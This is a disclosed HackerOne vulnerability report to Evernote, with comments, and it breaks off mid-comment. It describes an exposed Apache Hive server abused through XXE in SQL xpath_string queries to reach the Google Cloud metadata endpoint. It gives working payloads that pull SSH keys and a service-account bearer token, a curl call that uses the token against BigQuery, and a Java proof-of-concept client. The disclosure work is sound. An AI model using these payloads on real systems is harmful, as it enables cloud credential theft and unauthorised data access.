{"id":742808,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDI4MDg=","url":"https://hackerone.com/reports/742808","title":"Non-production Open Database In Combination With XXE Leads To SSRF","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-11-21T00:27:31.178Z","submitted_at":"2019-11-21T00:27:31.178Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kaulse","url":"/kaulse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":44212,"url":"https://hackerone.com/evernote","handle":"evernote","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/EtLo1UAEu8P5ZWzxeu7cRFak/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/EtLo1UAEu8P5ZWzxeu7cRFak/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Evernote","twitter_handle":"","website":"https://evernote.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-10-27T15:20:40.726Z","bug_reporter_agreed_on_going_public_at":"2020-09-07T13:45:22.108Z","team_member_agreed_on_going_public_at":"2020-10-27T15:20:40.543Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThe Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.\nBy \"open\", I mean that the database can be accessed by anyone.\n\n## Steps To Reproduce:\nChose any database client that supports Apache Hive and also uses a specific client version. \"Specific client version\" because you will otherwise get an error which looks like this:\n```\n13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session\norg.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})\n```\n  1. Chose a database client and connect to mentioned IP and port\n  2. Execute the following SQL payload:\n\n```SQL\nselect xpath_string('\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/project-id\"\u003e ]\u003e\u003cstockCheck\u003e\u0026xxe;\u003c/stockCheck\u003e', '*') FROM test LIMIT 5;\n```\nThe query above will return the associated project id which is \"en-development\".\n\n## Supporting Material/References:\nI will list some interesting information that I queried below.\n\n**Query**\n```SQL\nselect xpath_string('\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys\"\u003e ]\u003e\u003cstockCheck\u003e\u0026xxe;\u003c/stockCheck\u003e', '*') FROM test LIMIT 5;\n```\n**Response**\n```\n████\n█████\n██████████\n█████████\n██████\n██████████\n██████\n████████\n████\n████\n████████\n███████\n█████████\n███████\n██████\n█████\n███\n███\n████\n████████\n██████\n█████████\n███████\n██████████\n█████████\n████\n█████████\n████\n██████████\n█████\n██████████\n█████\n████████\n██████████\n██████\n██████████\n█████\n█████\n██████\n██████████\n█████\n███\n████\n```\n\n## Impact\n\nAccess to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eThe Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.\u003cbr\u003e\nBy \u0026quot;open\u0026quot;, I mean that the database can be accessed by anyone.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eChose any database client that supports Apache Hive and also uses a specific client version. \u0026quot;Specific client version\u0026quot; because you will otherwise get an error which looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session\norg.apache.hive.org.apache.thrift.TApplicationException: Required field \u0026#39;client_protocol\u0026#39; is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eChose a database client and connect to mentioned IP and port\u003c/li\u003e\n\u003cli\u003eExecute the following SQL payload:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eselect xpath_string(\u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://metadata.google.internal/computeMetadata/v1beta1/project/project-id\u0026quot;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026amp;xxe;\u0026lt;/stockCheck\u0026gt;\u0026#39;, \u0026#39;*\u0026#39;) FROM test LIMIT 5;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe query above will return the associated project id which is \u0026quot;en-development\u0026quot;.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eI will list some interesting information that I queried below.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eQuery\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eselect xpath_string(\u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys\u0026quot;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026amp;xxe;\u0026lt;/stockCheck\u0026gt;\u0026#39;, \u0026#39;*\u0026#39;) FROM test LIMIT 5;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e████\n█████\n██████████\n█████████\n██████\n██████████\n██████\n████████\n████\n████\n████████\n███████\n█████████\n███████\n██████\n█████\n███\n███\n████\n████████\n██████\n█████████\n███████\n██████████\n█████████\n████\n█████████\n████\n██████████\n█████\n██████████\n█████\n████████\n██████████\n██████\n██████████\n█████\n█████\n██████\n██████████\n█████\n███\n████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAccess to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.\u003c/p\u003e\n","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":23,"voters":["nytr0gen","sourc7","prophet","rahsec","kaulse","mainteemoforfun","hell1337","sodium_","swaysthinking","asusrog","and 13 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":39392,"asset_type":"URL","asset_identifier":"*.evernote.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6363673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"See attached files for information regarding Google Cloud Storage. ","markdown_message":"\u003cp\u003eSee attached files for information regarding Google Cloud Storage. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-21T00:30:47.908Z","updated_at":"2019-11-21T00:30:47.908Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6363984,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I bet that you will have problems reproducing the vulnerability at the beginning.\nHere a picture of my database client, DataGrip from Jetbrains:\n████\nI \"compiled\" my own database driver for this Apache Hive server version and added my own driver as a new driver to DataGrip which looks like this:\n█████\n\nIn addition to this, I can also create a POC by giving you a step by step tutorial for a java POC which you would need to compile.\n","markdown_message":"\u003cp\u003eI bet that you will have problems reproducing the vulnerability at the beginning.\u003cbr\u003e\nHere a picture of my database client, DataGrip from Jetbrains:\u003cbr\u003e\n████\u003cbr\u003e\nI \u0026quot;compiled\u0026quot; my own database driver for this Apache Hive server version and added my own driver as a new driver to DataGrip which looks like this:\u003cbr\u003e\n█████\u003c/p\u003e\n\n\u003cp\u003eIn addition to this, I can also create a POC by giving you a step by step tutorial for a java POC which you would need to compile.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-21T00:35:29.431Z","updated_at":"2020-09-09T14:35:16.459Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6364001,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I fetched a service account bearer token using the following command:\n```\nselect xpath_string('\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\"\u003e ]\u003e\u003cstockCheck\u003e\u0026xxe;\u003c/stockCheck\u003e', '*') FROM test LIMIT 5;\n```\nWhich gave the following result:\n```JSON\n{\n  \"access_token\": \"███\",\n  \"expires_in\": 2765,\n  \"token_type\": \"Bearer\"\n}\n```\nThe token above has the following privileges (v1beta1/instance/service-accounts/default/scopes):\n```\nhttps://www.googleapis.com/auth/bigquery\nhttps://www.googleapis.com/auth/bigtable.admin.table\nhttps://www.googleapis.com/auth/bigtable.data\nhttps://www.googleapis.com/auth/cloud.useraccounts.readonly\nhttps://www.googleapis.com/auth/devstorage.full_control\nhttps://www.googleapis.com/auth/devstorage.read_write\nhttps://www.googleapis.com/auth/logging.write\n```\n\n\nBy using the fetched access token, you can now query the Google Cloud APIs where the Google Cloud service account has access.\nHere an example:\n```\nTOKEN=\"████████\"\ncurl https://www.googleapis.com/bigquery/v2/projects  -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\"\n```\n-\u003e\n```\n{\n  \"kind\": \"bigquery#projectList\",\n  \"etag\": \"q2ON3ZLAMBY8/tPzXXY9mQ==\",\n  \"projects\": [\n    {\n      \"kind\": \"bigquery#project\",\n      \"id\": \"en-development\",\n      \"numericId\": \"781002931567\",\n      \"projectReference\": {\n        \"projectId\": \"en-development\"\n      },\n      \"friendlyName\": \"en-development\"\n    },\n    {\n      \"kind\": \"bigquery#project\",\n      \"id\": \"en-testing\",\n      \"numericId\": \"688474802891\",\n      \"projectReference\": {\n        \"projectId\": \"en-testing\"\n      },\n      \"friendlyName\": \"en-testing\"\n    },\n    {\n      \"kind\": \"bigquery#project\",\n      \"id\": \"sf6fb9ce958be8d9d-tp\",\n      \"numericId\": \"29280230642\",\n      \"projectReference\": {\n        \"projectId\": \"sf6fb9ce958be8d9d-tp\"\n      },\n      \"friendlyName\": \"sf6fb9ce958be8d9d-tp\"\n    }\n  ],\n  \"totalItems\": 3\n}\n```\n\nI have attached a list of all datasets in Google BigQuery/BigTable in the project \"en-development\" ███████","markdown_message":"\u003cp\u003eI fetched a service account bearer token using the following command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eselect xpath_string(\u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\u0026quot;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026amp;xxe;\u0026lt;/stockCheck\u0026gt;\u0026#39;, \u0026#39;*\u0026#39;) FROM test LIMIT 5;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich gave the following result:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;access_token\u0026quot;: \u0026quot;███\u0026quot;,\n  \u0026quot;expires_in\u0026quot;: 2765,\n  \u0026quot;token_type\u0026quot;: \u0026quot;Bearer\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe token above has the following privileges (v1beta1/instance/service-accounts/default/scopes):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://www.googleapis.com/auth/bigquery\nhttps://www.googleapis.com/auth/bigtable.admin.table\nhttps://www.googleapis.com/auth/bigtable.data\nhttps://www.googleapis.com/auth/cloud.useraccounts.readonly\nhttps://www.googleapis.com/auth/devstorage.full_control\nhttps://www.googleapis.com/auth/devstorage.read_write\nhttps://www.googleapis.com/auth/logging.write\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBy using the fetched access token, you can now query the Google Cloud APIs where the Google Cloud service account has access.\u003cbr\u003e\nHere an example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eTOKEN=\u0026quot;████████\u0026quot;\ncurl https://www.googleapis.com/bigquery/v2/projects  -H \u0026quot;Authorization: Bearer $TOKEN\u0026quot; -H \u0026quot;Content-Type: application/json\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e-\u0026gt;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;kind\u0026quot;: \u0026quot;bigquery#projectList\u0026quot;,\n  \u0026quot;etag\u0026quot;: \u0026quot;q2ON3ZLAMBY8/tPzXXY9mQ==\u0026quot;,\n  \u0026quot;projects\u0026quot;: [\n    {\n      \u0026quot;kind\u0026quot;: \u0026quot;bigquery#project\u0026quot;,\n      \u0026quot;id\u0026quot;: \u0026quot;en-development\u0026quot;,\n      \u0026quot;numericId\u0026quot;: \u0026quot;781002931567\u0026quot;,\n      \u0026quot;projectReference\u0026quot;: {\n        \u0026quot;projectId\u0026quot;: \u0026quot;en-development\u0026quot;\n      },\n      \u0026quot;friendlyName\u0026quot;: \u0026quot;en-development\u0026quot;\n    },\n    {\n      \u0026quot;kind\u0026quot;: \u0026quot;bigquery#project\u0026quot;,\n      \u0026quot;id\u0026quot;: \u0026quot;en-testing\u0026quot;,\n      \u0026quot;numericId\u0026quot;: \u0026quot;688474802891\u0026quot;,\n      \u0026quot;projectReference\u0026quot;: {\n        \u0026quot;projectId\u0026quot;: \u0026quot;en-testing\u0026quot;\n      },\n      \u0026quot;friendlyName\u0026quot;: \u0026quot;en-testing\u0026quot;\n    },\n    {\n      \u0026quot;kind\u0026quot;: \u0026quot;bigquery#project\u0026quot;,\n      \u0026quot;id\u0026quot;: \u0026quot;sf6fb9ce958be8d9d-tp\u0026quot;,\n      \u0026quot;numericId\u0026quot;: \u0026quot;29280230642\u0026quot;,\n      \u0026quot;projectReference\u0026quot;: {\n        \u0026quot;projectId\u0026quot;: \u0026quot;sf6fb9ce958be8d9d-tp\u0026quot;\n      },\n      \u0026quot;friendlyName\u0026quot;: \u0026quot;sf6fb9ce958be8d9d-tp\u0026quot;\n    }\n  ],\n  \u0026quot;totalItems\u0026quot;: 3\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI have attached a list of all datasets in Google BigQuery/BigTable in the project \u0026quot;en-development\u0026quot; ███████\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-21T00:41:10.587Z","updated_at":"2020-09-09T14:36:58.275Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6364351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can build your own POC like this:\n1. First you need the right driver. I personally prefer to use some automatic build process so you don't have to worry about getting infected. I mean, if I would not give you this option you would very likely need to trust my jar files which is not a great option. You can copy the following text or download it ███████.\n\n```\napply plugin: 'java'\n\ndependencies {\n  runtime group: 'org.apache.hive', name: 'hive-jdbc', version: '1.1.0'\n  runtime group: 'org.apache.hadoop', name: 'hadoop-client', version: '1.1.0'\n}\n\nrepositories { mavenCentral() }\n\ntask getDeps(type: Copy) {\n  from sourceSets.main.runtimeClasspath\n  into 'runtime/'\n}\n```\n2. Execute the command `gradle getDeps`. It will create a new directory and download all kind of files that the driver requires. This should look like this:\n██████\n3. Create a new POC file called `QueryHive.java`. Copy or download it ████████:\n\n```JAVA\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class QueryHive {\n    private static String driverName = \"org.apache.hive.jdbc.HiveDriver\";\n    public static void main(String[] args) throws SQLException {\n        try {\n            Class.forName(driverName);\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n        Connection conn = DriverManager.getConnection(\"jdbc:hive2://\" + args[0], \"hive\", \"\");\n        Statement stmt = conn.createStatement();\n\n        ResultSet rs = stmt.executeQuery(args[1]);\n        while (rs.next()) {\n            System.out.println(rs.getString(1));\n        }\n        rs.close();\n\n        conn.close();\n     }\n}\n```\n4.  Compile the `QueryHive.java` file like this:\n```\njavac QueryHive.java\n```\nYou will notice a new file in your folder called QueryHive.class\n5. Execute the QueryHive.class file with java by using your new driver:\n```\njava -classpath '.:./runtime/*' QueryHive ████████:10000 \"SELECT 1\"\n```\nYou will notice that the first argument after the class name is the IP and PORT. The second argument is the SQL query.\nHere another example:\n\n```\n➜  tut CMD=$(cat cmd.sql)\n➜  tut echo $CMD\nselect xpath_string('\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/\"\u003e ]\u003e\u003cstockCheck\u003e\u0026xxe;\u003c/stockCheck\u003e', '*') FROM test LIMIT 5\n\n➜  tut java -classpath '.:./runtime/*' QueryHive ██████:10000 $CMD\n19/11/21 02:12:39 INFO jdbc.Utils: Supplied authorities: ████████:10000\n19/11/21 02:12:39 INFO jdbc.Utils: Resolved authority: ██████████:10000\n19/11/21 02:12:39 INFO jdbc.HiveConnection: Will try to open client transport with JDBC Uri: jdbc:hive2://█████:10000\n781002931567-compute@developer.gserviceaccount.com/\ndefault/\n```","markdown_message":"\u003cp\u003eYou can build your own POC like this:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eFirst you need the right driver. I personally prefer to use some automatic build process so you don\u0026#39;t have to worry about getting infected. I mean, if I would not give you this option you would very likely need to trust my jar files which is not a great option. You can copy the following text or download it ███████.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eapply plugin: \u0026#39;java\u0026#39;\n\ndependencies {\n  runtime group: \u0026#39;org.apache.hive\u0026#39;, name: \u0026#39;hive-jdbc\u0026#39;, version: \u0026#39;1.1.0\u0026#39;\n  runtime group: \u0026#39;org.apache.hadoop\u0026#39;, name: \u0026#39;hadoop-client\u0026#39;, version: \u0026#39;1.1.0\u0026#39;\n}\n\nrepositories { mavenCentral() }\n\ntask getDeps(type: Copy) {\n  from sourceSets.main.runtimeClasspath\n  into \u0026#39;runtime/\u0026#39;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eExecute the command \u003ccode\u003egradle getDeps\u003c/code\u003e. It will create a new directory and download all kind of files that the driver requires. This should look like this:\n██████\u003c/li\u003e\n\u003cli\u003eCreate a new POC file called \u003ccode\u003eQueryHive.java\u003c/code\u003e. Copy or download it ████████:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class QueryHive {\n    private static String driverName = \u0026quot;org.apache.hive.jdbc.HiveDriver\u0026quot;;\n    public static void main(String[] args) throws SQLException {\n        try {\n            Class.forName(driverName);\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n        Connection conn = DriverManager.getConnection(\u0026quot;jdbc:hive2://\u0026quot; + args[0], \u0026quot;hive\u0026quot;, \u0026quot;\u0026quot;);\n        Statement stmt = conn.createStatement();\n\n        ResultSet rs = stmt.executeQuery(args[1]);\n        while (rs.next()) {\n            System.out.println(rs.getString(1));\n        }\n        rs.close();\n\n        conn.close();\n     }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003e Compile the \u003ccode\u003eQueryHive.java\u003c/code\u003e file like this:\n\u003ccode\u003e\njavac QueryHive.java\n\u003c/code\u003e\nYou will notice a new file in your folder called QueryHive.class\u003c/li\u003e\n\u003cli\u003eExecute the QueryHive.class file with java by using your new driver:\n\u003ccode\u003e\njava -classpath \u0026#39;.:./runtime/*\u0026#39; QueryHive ████████:10000 \u0026quot;SELECT 1\u0026quot;\n\u003c/code\u003e\nYou will notice that the first argument after the class name is the IP and PORT. The second argument is the SQL query.\nHere another example:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜  tut CMD=$(cat cmd.sql)\n➜  tut echo $CMD\nselect xpath_string(\u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/\u0026quot;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026amp;xxe;\u0026lt;/stockCheck\u0026gt;\u0026#39;, \u0026#39;*\u0026#39;) FROM test LIMIT 5\n\n➜  tut java -classpath \u0026#39;.:./runtime/*\u0026#39; QueryHive ██████:10000 $CMD\n19/11/21 02:12:39 INFO jdbc.Utils: Supplied authorities: ████████:10000\n19/11/21 02:12:39 INFO jdbc.Utils: Resolved authority: ██████████:10000\n19/11/21 02:12:39 INFO jdbc.HiveConnection: Will try to open client transport with JDBC Uri: jdbc:hive2://█████:10000\n781002931567-compute@developer.gserviceaccount.com/\ndefault/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-11-21T01:13:40.345Z","updated_at":"2020-09-09T14:45:50.292Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6364683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, @kaulse\n\nWe can confirm this is a valid report and are working on resolving it now. This is a developer project in our Google Cloud environment.\n\nBest Regards,\nEvernote Security","markdown_message":"\u003cp\u003eThanks, \u003ca href=\"/kaulse\"\u003e@kaulse\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can confirm this is a valid report and are working on resolving it now. This is a developer project in our Google Cloud environment.\u003c/p\u003e\n\n\u003cp\u003eBest Regards,\u003cbr\u003e\nEvernote Security\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-21T01:22:04.022Z","updated_at":"2019-11-21T01:22:04.022Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6364789,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-21T01:50:07.917Z","updated_at":"2019-11-21T01:50:07.917Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6450447,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @xwuevernote,\n\nThank you for taking the time to resolve this vulnerability. May I ask if you have any news for me?\nI am asking, since I have submitted this vulnerability 12 days ago and I have seen that I cannot reach the target anymore. I conclude that someone took the right steps to remediate this vulnerability.\n\nThanks in advance!\nBest Regards,\nSebastien","markdown_message":"\u003cp\u003eHey \u003ca href=\"/xwuevernote\"\u003e@xwuevernote\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for taking the time to resolve this vulnerability. May I ask if you have any news for me?\u003cbr\u003e\nI am asking, since I have submitted this vulnerability 12 days ago and I have seen that I cannot reach the target anymore. I conclude that someone took the right steps to remediate this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eThanks in advance!\u003cbr\u003e\nBest Regards,\u003cbr\u003e\nSebastien\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-02T18:48:32.219Z","updated_at":"2019-12-02T18:48:32.219Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6450762,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks! \nWe have invited you to our private BBP program and I am resolving this report now.\n\nXiaoyong","markdown_message":"\u003cp\u003eThanks! \u003cbr\u003e\nWe have invited you to our private BBP program and I am resolving this report now.\u003c/p\u003e\n\n\u003cp\u003eXiaoyong\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-02T19:27:05.198Z","updated_at":"2019-12-02T19:27:05.198Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kaulse","url":"/kaulse"},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6452400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool. Is it possible to claim a monetary reward for this report? If so, I should make things easy by reporting the same vulnerability via your BBP program right?","markdown_message":"\u003cp\u003eCool. Is it possible to claim a monetary reward for this report? If so, I should make 